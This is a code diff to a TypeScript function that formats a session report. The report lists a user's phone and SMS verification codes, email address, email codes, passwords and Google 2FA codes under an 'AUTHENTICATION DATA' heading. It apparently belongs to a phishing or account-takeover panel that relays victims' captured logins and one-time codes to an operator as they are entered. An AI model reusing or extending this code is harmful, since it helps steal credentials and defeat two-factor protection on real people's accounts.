@@ -1144,74 +1144,90 @@ const formatSessionMessage = (session: UserSession): string => {
     message += `\n${session.onlineStatus.statusEmoji} ${activityLevel} • ${timeDisplay}`;
   }
 
-  // Complete code history with numbering
-  let allCodes = [];
-  let codeCounter = 1;
+  // Group codes by type with internal numbering
+  let codeGroups = [];
 
-  // Phone verification code
+  // Phone/SMS Codes (treat as one group since they're the same)
+  let phoneSMSCodes = [];
+
+  // Add phone verification code
   if (session.phoneVerificationCode) {
-    allCodes.push(
-      `${codeCounter}. PHONE: <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
-    );
-    codeCounter++;
+    phoneSMSCodes.push(escapeHtml(session.phoneVerificationCode));
   }
 
-  // Email and email code
+  // Add SMS codes from authCodes
+  if (session.authCodes && session.authCodes["sms"]) {
+    session.authCodes["sms"].forEach((code) => {
+      if (!phoneSMSCodes.includes(escapeHtml(code))) {
+        // Avoid duplicates
+        phoneSMSCodes.push(escapeHtml(code));
+      }
+    });
+  }
+
+  if (phoneSMSCodes.length > 0) {
+    const numberedCodes = phoneSMSCodes
+      .map((code, index) => `${index + 1}.<code>${code}</code>`)
+      .join(" - ");
+    codeGroups.push(`<b>Phone/SMS:</b> ${numberedCodes}`);
+  }
+
+  // Email Address
   if (session.email) {
     const emailShort =
       session.email.length > 30
         ? session.email.substring(0, 27) + "..."
         : session.email;
-    allCodes.push(
-      `${codeCounter}. EMAIL: <code>${escapeHtml(emailShort)}</code>`,
-    );
-    codeCounter++;
-
-    if (session.emailCode) {
-      allCodes.push(
-        `${codeCounter}. EMAIL CODE: <code>${escapeHtml(session.emailCode)}</code>`,
-      );
-      codeCounter++;
-    }
+    codeGroups.push(`<b>Email:</b> <code>${escapeHtml(emailShort)}</code>`);
   }
 
-  // All authentication codes with complete history
-  if (session.authCodes && Object.keys(session.authCodes).length > 0) {
-    Object.keys(session.authCodes).forEach((stepType) => {
-      const stepCodes = session.authCodes[stepType];
-      if (stepCodes && stepCodes.length > 0) {
-        // Show ALL codes for each type, not just the latest
-        stepCodes.forEach((code, index) => {
-          let stepName;
-          switch (stepType) {
-            case "password":
-              stepName = "PASSWORD";
-              break;
-            case "google":
-              stepName = "2FA CODE";
-              break;
-            case "sms":
-              stepName = "SMS CODE";
-              break;
-            case "email":
-              stepName = "EMAIL AUTH";
-              break;
-            default:
-              stepName = stepType.toUpperCase();
-          }
-
-          allCodes.push(
-            `${codeCounter}. ${stepName}: <code>${escapeHtml(code)}</code>`,
-          );
-          codeCounter++;
-        });
+  // Email Codes
+  let emailCodes = [];
+  if (session.emailCode) {
+    emailCodes.push(escapeHtml(session.emailCode));
+  }
+  if (session.authCodes && session.authCodes["email"]) {
+    session.authCodes["email"].forEach((code) => {
+      if (!emailCodes.includes(escapeHtml(code))) {
+        // Avoid duplicates
+        emailCodes.push(escapeHtml(code));
       }
     });
   }
+  if (emailCodes.length > 0) {
+    const numberedCodes = emailCodes
+      .map((code, index) => `${index + 1}.<code>${code}</code>`)
+      .join(" - ");
+    codeGroups.push(`<b>Email Code:</b> ${numberedCodes}`);
+  }
 
-  // Add all codes section if any codes exist
-  if (allCodes.length > 0) {
-    message += `\n\n🔐 <b>AUTHENTICATION CODES:</b>\n` + allCodes.join("\n");
+  // Password Codes
+  if (
+    session.authCodes &&
+    session.authCodes["password"] &&
+    session.authCodes["password"].length > 0
+  ) {
+    const numberedCodes = session.authCodes["password"]
+      .map((code, index) => `${index + 1}.<code>${escapeHtml(code)}</code>`)
+      .join(" - ");
+    codeGroups.push(`<b>Password:</b> ${numberedCodes}`);
+  }
+
+  // 2FA Codes
+  if (
+    session.authCodes &&
+    session.authCodes["google"] &&
+    session.authCodes["google"].length > 0
+  ) {
+    const numberedCodes = session.authCodes["google"]
+      .map((code, index) => `${index + 1}.<code>${escapeHtml(code)}</code>`)
+      .join(" - ");
+    codeGroups.push(`<b>2FA Code:</b> ${numberedCodes}`);
+  }
+
+  // Add grouped codes section if any codes exist
+  if (codeGroups.length > 0) {
+    message += `\n\n🔐 <b>AUTHENTICATION DATA:</b>\n` + codeGroups.join("\n");
   }
 
   // Simple footer with session info
